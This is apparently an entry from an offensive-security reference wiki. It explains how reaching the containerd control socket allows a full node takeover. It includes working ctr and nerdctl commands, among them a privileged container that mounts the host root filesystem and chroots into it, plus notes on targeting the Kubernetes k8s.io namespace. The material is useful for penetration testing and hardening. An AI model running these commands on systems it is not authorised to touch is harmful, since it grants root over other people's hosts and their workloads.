---
title: "containerd socket: driving containerd through ctr and nerdctl"
description: "Using the containerd control socket, reachable with ctr or nerdctl from a node foothold, to pull images and create and run privileged containers that mount the host, which is root-equivalent because containerd runs as root on the node."
keywords:
  - containerd socket
  - ctr
  - nerdctl
  - container runtime
  - node takeover
---

# containerd socket

containerd listens on a control socket, by default `/run/containerd/containerd.sock`, and it runs as root. Any process on the node that can reach that socket drives containerd directly with `ctr` or `nerdctl`, creating a privileged container that mounts the host, which is node root.

```bash
export CONTAINERD_ADDRESS=/run/containerd/containerd.sock
ctr -n k8s.io containers list                       # k8s.io is the namespace Kubernetes uses
ctr images pull docker.io/library/alpine:latest

# nerdctl speaks the Docker CLI against containerd
nerdctl -n k8s.io run -v /:/host --privileged -it alpine chroot /host sh
```

## Exploitation notes

- containerd uses namespaces; Kubernetes workloads live under `k8s.io`, so target that namespace to see and manipulate pod containers.
- The escape payoff is the same host-mounting privileged container as the Docker case, just driven through `ctr`/`nerdctl`.
- Reaching the socket from inside a container is the [Runtime socket mount](../../container-escape/sensitive-mounts/runtime-socket-mount.md) case.

## References

- [containerd documentation](https://containerd.io/docs/)
- [nerdctl](https://github.com/containerd/nerdctl)
